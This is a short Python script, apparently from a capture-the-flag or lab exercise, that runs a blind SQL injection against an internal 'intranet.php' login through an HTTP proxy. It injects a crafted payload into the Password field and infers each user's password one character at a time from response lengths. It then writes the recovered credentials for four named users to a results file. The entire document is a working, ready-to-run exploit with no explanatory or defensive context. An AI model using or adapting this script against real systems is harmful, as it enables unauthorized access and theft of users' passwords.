#!/usr/bin/env python3

import requests
import string
import sys

url = 'http://172.31.179.1/intranet.php'
proxy = 'http://10.10.10.200:3128'
users = ['rita','jim','bryan','sarah']
chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@^_~'

for user in users:
	data = {'Username':'','Password':"'or Username='{}' and substring(Password,1,1)='a".format(user)}
	request = requests.post(url, data=data, proxies={'http':proxy})
	invalid_len = len(request.text)

file = open('./sqli-results.txt','w')

def sqli(user):
	cracked = ''
	print("[+] Exfiltrating Password for {}".format(user))

	for i in range(1,30):
		match = False
		for j in range(len(chars)):
			data = {'Username':'','Password':"'or Username='{}' and substring(Password,1,{})='{}{}".format(user, i, cracked, chars[j])}
			request = requests.post(url, data=data, proxies={'http':proxy})
			if len(request.text) != invalid_len:
				match = True
				cracked+=chars[j]
				print("[+] Result: {}".format(cracked))
				break
		if not match:
			break
	return cracked

#print(invalid_len)
for user in users:
	out = sqli(user)
	print(user+' : '+out)
	file.write("{}:{}\n".format(user, out))

print("Done! Passwords saved to sqli-results.txt")


